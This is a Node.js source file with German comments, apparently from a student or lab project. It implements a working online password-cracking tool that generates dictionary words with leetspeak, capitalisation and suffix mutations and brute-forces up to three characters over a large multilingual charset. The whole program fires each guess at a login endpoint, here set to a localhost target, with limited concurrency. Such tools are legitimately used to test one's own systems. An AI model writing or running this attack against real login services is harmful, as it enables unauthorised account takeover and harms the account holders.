/*
Filename: crack2.js
Kurzbeschreibung:
  Wörterbuchbasierter Brute-Force-Angreifer mit Mutationen (Leet, Groß-/Kleinschreibung, Suffixe).
  Liest optional dictionary.txt und testet abgewandelte Passwortvarianten gegen den lokalen Login-Endpunkt.
  Enthält zusätzlich eine Fallback-Brute-Force-Funktion (Mono-Charset, kurze Länge) für den Notfall.
Aufrufparameter:
  node crack2.js <username>
Autor:
  Frederik, Kian
Datum:
  29.10.2025
*/

const fs = require('fs');
const path = require('path');
const fetch = global.fetch || require('node-fetch');
const TARGET_URL = 'http://localhost:3000/login';
const DICT_PATH = path.resolve(__dirname, 'dictionary.txt');
const MAX_TRIES = 20000000;
let found = false;

/**
 * Implementiert eine einfache Concurrency-Limitierung für asynchrone Operationen.
 * Verhindert, dass zu viele parallele Requests gleichzeitig ausgeführt werden.
 *
 * @param {number} concurrency - Maximale Anzahl gleichzeitiger Operationen
 * @returns {Function} - Funktion zum Einreihen von Promises
 */
const pLimit = (concurrency) => {
    const queue = [];  // Warteschlange für ausstehende Tasks
    let active = 0;    // Anzahl aktuell laufender Tasks

    /**
     * Verarbeitet die nächste Task in der Warteschlange, falls möglich
     */
    const next = () => {
        if (queue.length === 0) return;  // Keine Tasks vorhanden
        if (active >= concurrency) return;  // Limit bereits erreicht

        active++;
        const {fn, resolve} = queue.shift();  // Nimm nächste Task

        // Führe Task aus und handle Completion
        fn().then((r) => {
            active--;
            resolve(r);
            next();  // Verarbeite nächste Task
        }, (e) => {
            active--;
            resolve(Promise.reject(e));
            next();  // Verarbeite nächste Task auch bei Fehler
        });
    };

    // Returniere Funktion zum Einreihen neuer Tasks
    return (fn) => new Promise((resolve) => {
        queue.push({fn, resolve});
        next();
    });
};

// Extrahiere Benutzernamen aus Kommandozeilenargumenten
const USERNAME = process.argv[2];
if (!USERNAME) {
    console.error('Usage: node attacker.js <username>');
    process.exit(1);
}

/**
 * Maskiert einen String, um sensible Daten in Logs zu schützen.
 * Zeigt nur die letzten 2 Zeichen im Klartext.
 *
 * @param {string} s - Zu maskierender String
 * @returns {string} - Maskierter String
 */
function safeMask(s) {
    if (!s) return '';
    return s.replace(/.(?=.{2})/g, '*');
}

// Leetspeak-Ersetzungstabelle: Buchstaben -> Zahlen/Symbole
const leetMap = {
    a: ['4', '@'],
    e: ['3'],
    i: ['1', '!'],
    o: ['0'],
    s: ['5', '$'],
    t: ['7']
};

/**
 * Generiert alle möglichen Leetspeak-Varianten eines Wortes.
 * Beispiel: "test" -> ["test", "t3st", "te5t", "7est", etc.]
 *
 * @param {string} word - Ausgangswort
 * @returns {string[]} - Array aller Leetspeak-Varianten
 */
function leetVariants(word) {
    const res = new Set();  // Set verhindert Duplikate

    /**
     * Rekursive Hilfsfunktion zum Generieren der Varianten
     * @param {number} idx - Aktuelle Position im Wort
     * @param {string} cur - Bisher aufgebaute Variante
     */
    function helper(idx, cur) {
        if (idx === word.length) {
            res.add(cur);  // Vollständige Variante erreicht
            return;
        }

        const ch = word[idx];
        helper(idx + 1, cur + ch);  // Originalzeichen beibehalten

        const low = ch.toLowerCase();
        // Falls Leetspeak-Ersetzungen existieren, generiere zusätzliche Varianten
        if (leetMap[low]) {
            for (const sub of leetMap[low]) {
                helper(idx + 1, cur + sub);
            }
        }
    }

    helper(0, '');
    return Array.from(res);
}

/**
 * Generiert verschiedene Groß-/Kleinschreibungs-Varianten eines Strings.
 *
 * @param {string} s - Eingabestring
 * @returns {Set<string>} - Set mit Varianten: original, lowercase, UPPERCASE, Capitalized
 */
function capsVariants(s) {
    return new Set([
        s,                                    // Original
        s.toLowerCase(),                      // alles klein
        s.toUpperCase(),                      // ALLES GROSS
        s[0].toUpperCase() + s.slice(1)      // Erste Buchstabe groß
    ]);
}

/**
 * Lädt Basis-Wörter aus der Wörterbuch-Datei.
 *
 * @returns {string[]} - Array mit Basis-Wörtern
 */
function buildBaseWords() {
    const words = new Set();

    // Lese Wörterbuch-Datei, falls vorhanden
    if (fs.existsSync(DICT_PATH)) {
        const lines = fs.readFileSync(DICT_PATH, 'utf8')
            .split(/\r?\n/)              // Zeilen aufteilen
            .map(l => l.trim())          // Whitespace entfernen
            .filter(Boolean);            // Leere Zeilen entfernen

        lines.forEach(w => words.add(w));
    }

    return Array.from(words);
}

/**
 * Erweitert Basis-Wörter mit verschiedenen Mutationen und Kombinationen.
 * Verwendet gängige Muster wie Suffixe, Leetspeak, Kombinationen etc.
 *
 * @param {string[]} baseWords - Array mit Basis-Wörtern
 * @returns {string[]} - Erweitertes Array mit allen Mutationen
 */
function expandWithMutations(baseWords) {
    const out = new Set();

    // Häufig verwendete Passwort-Suffixe
    const commonSuffixes = ['!', '1', '123', '2020', '2021', '2022', '#'];

    // Häufig eingefügte Sonderzeichen
    const specialInserts = ['!', '.', '_', '-', '@'];

    // Erste Mutationsrunde: Groß-/Kleinschreibung + Suffixe + Leetspeak
    for (const w of baseWords) {
        // Groß-/Kleinschreibungs-Varianten
        for (const v of capsVariants(w)) {
            out.add(v);

            // Füge gängige Suffixe hinzu
            for (const s of commonSuffixes) {
                out.add(v + s);
            }

            // Generiere Leetspeak-Varianten
            for (const l of leetVariants(v)) {
                out.add(l);
            }

            // Ausrufezeichen am Anfang/Ende
            out.add(v + '!');
            out.add('!' + v);
        }

        // Spezielle Jahr-Suffixe
        out.add(w + '123');
        out.add(w + '2023');

        // Sonderzeichen-Suffixe
        for (const c of specialInserts) {
            out.add(w + c);
        }
    }

    // Zweite Mutationsrunde: Wort-Kombinationen
    // Kombiniere die ersten 200 Wörter paarweise (begrenzt wegen Komplexität)
    const arr = Array.from(out);
    for (let i = 0; i < Math.min(200, arr.length); i++) {
        for (let j = 0; j < Math.min(200, arr.length); j++) {
            if (i === j) continue;  // Keine Selbst-Kombination
            out.add(arr[i] + arr[j]);
        }
    }

    return Array.from(out);
}

/**
 * Generator-Funktion für systematische Brute-Force-Passwort-Generierung.
 * Erzeugt alle möglichen Kombinationen aus dem Zeichensatz bis zur maximalen Länge.
 *
 * @param {string[]} charset - Array mit verfügbaren Zeichen
 * @param {number} maxLen - Maximale Passwortlänge
 * @yields {string} - Nächster Passwort-Kandidat
 */
function* generateAndTest(charset, maxLen) {
    // Iteriere über alle Längen
    for (let len = 1; len <= maxLen; len++) {
        const indices = Array(len).fill(0);  // Index-Array für Zeichenpositionen

        while (true) {
            // Konvertiere Indices zu tatsächlichem Passwort
            yield indices.map(i => charset[i]).join('');

            // Inkrementiere Indices (funktioniert wie ein Zählwerk)
            let pos = len - 1;  // Beginne bei der letzten Position
            while (pos >= 0) {
                indices[pos]++;
                if (indices[pos] < charset.length) break;  // Kein Überlauf
                indices[pos] = 0;  // Überlauf: Reset und carry
                pos--;
            }

            // Wenn alle Positionen übergelaufen sind, fertig mit dieser Länge
            if (pos < 0) break;
        }
    }
}

/**
 * Testet einen Passwort-Kandidaten gegen den Login-Endpoint.
 *
 * @param {string} candidate - Zu testendes Passwort
 * @returns {Promise<boolean>} - true wenn erfolgreich, sonst false
 */
async function tryCandidate(candidate) {
    if (found) return false;  // Abbruch, falls bereits gefunden

    const body = {username: USERNAME, password: candidate};

    try {
        const resp = await fetch(TARGET_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(body)
        });

        if (resp.status === 200) {
            // Erfolgreicher Login - Passwort gefunden!
            console.log(`FOUND password for ${USERNAME}: ${candidate}`);
            found = true;
            return true;
        } else {
            return false;
        }
    } catch (err) {
        console.error('Network error for candidate', safeMask(candidate), err.message);
        return false;
    }
}

/**
 * Hauptfunktion: Führt den mehrstufigen Passwort-Angriff aus
 */
(async () => {
    // Phase 1: Wörterbuch-Angriff mit Mutationen
    const base = buildBaseWords();
    console.log('Base words from files/personal:', base.slice(0, 20));

    let candidates = expandWithMutations(base);
    console.log(`Generated ${candidates.length} mutated candidates (capped).`);

    // Füge häufige Standard-Passwörter hinzu
    const common = ['password', '123456', 'qwerty', 'letmein', 'welcome'];
    candidates = candidates.concat(common);

    // Begrenze auf maximale Anzahl Versuche
    if (candidates.length > MAX_TRIES) {
        candidates = candidates.slice(0, MAX_TRIES);
    }

    // Teste alle Wörterbuch-basierten Kandidaten mit Concurrency-Limit
    const limit = pLimit(5);  // Maximal 5 parallele Requests
    for (const c of candidates) {
        if (found) break;  // Abbruch bei Erfolg
        await limit(() => tryCandidate(c));
    }

    // Phase 2: Brute-Force-Fallback, falls Wörterbuch-Angriff fehlschlägt
    if (!found) {
        console.log('No match in dictionary/mutation phase.');

        // Erweiterte Zeichensatz-Definition (mehrsprachig + Sonderzeichen)
        const charset = (
            // Englisches Alphabet
            'abcdefghijklmnopqrstuvwxyz' +
            'ABCDEFGHIJKLMNOPQRSTUVWXYZ' +

            // Ziffern
            '0123456789' +

            // Deutsche Umlaute
            'äöüß' +
            'ÄÖÜ' +

            // Französische Zeichen
            'àâæçéèêëïîôùûüÿœ' +
            'ÀÂÆÇÉÈÊËÏÎÔÙÛÜŸŒ' +

            // Spanische und Portugiesische Zeichen
            'áàâãåéèêëíìîïñóòôõöúùûüç' +
            'ÁÀÂÃÅÉÈÊËÍÌÎÏÑÓÒÔÕÖÚÙÛÜÇ' +

            // Italienische Zeichen
            'àèéìíîòóùú' +
            'ÀÈÉÌÍÎÒÓÙÚ' +

            // Skandinavische Zeichen (Dänisch, Norwegisch, Schwedisch)
            'åæøåäö' +
            'ÅÆØÅÄÖ' +

            // Isländische Zeichen
            'áðéíóúýþæö' +
            'ÁÐÉÍÓÚÝÞÆÖ' +

            // Polnische Zeichen
            'ąćęłńóśźż' +
            'ĄĆĘŁŃÓŚŹŻ' +

            // Tschechische und Slowakische Zeichen
            'áčďéěíňóřšťúůýž' +
            'ÁČĎÉĚÍŇÓŘŠŤÚŮÝŽ' +

            // Ungarische Zeichen
            'áéíóöőúüű' +
            'ÁÉÍÓÖŐÚÜŰ' +

            // Rumänische Zeichen
            'ăâîșț' +
            'ĂÂÎȘȚ' +

            // Türkische Zeichen
            'çğıİöşü' +
            'ÇĞIİÖŞÜ' +

            // Kroatische und Serbische (lateinisch) Zeichen
            'čćđšž' +
            'ČĆĐŠŽ' +

            // Lettische und Litauische Zeichen
            'āčēģīķļņšūž' +
            'ĀČĒĢĪĶĻŅŠŪŽ' +

            // Estnische Zeichen
            'äõöüšž' +
            'ÄÕÖÜŠŽ' +

            // Kyrillisch (Russisch, Ukrainisch, Bulgarisch, etc.)
            'абвгдеёжзийклмнопрстуфхцчшщъыьэюя' +
            'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ' +

            // Griechische Zeichen
            'αβγδεζηθικλμνξοπρστυφχψω' +
            'ΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩ' +

            // CJK (Chinesisch, Japanisch, Koreanisch) - Beispielzeichen
            '密码漢字日本語한국어' +

            // Sonderzeichen und Symbole
            '!@#$%^&*()_+-=[]{}|;:,.<>?/\\`~\'"'
        ).split('');

        // Generiere und teste alle Kombinationen bis Länge 3
        const gen = generateAndTest(charset, 3);
        let tries = 0;

        for (const candidate of gen) {
            if (found) break;  // Abbruch bei Erfolg
            tries++;

            // Fortschrittsanzeige alle 1000 Versuche
            if (tries % 1000 === 0) {
                process.stdout.write(`Tried ${tries}\r`);
            }

            await limit(() => tryCandidate(candidate));
        }
    }

    // Finale Meldung
    if (!found) {
        console.log('Finished test run; password not found (within limits).');
    }
})();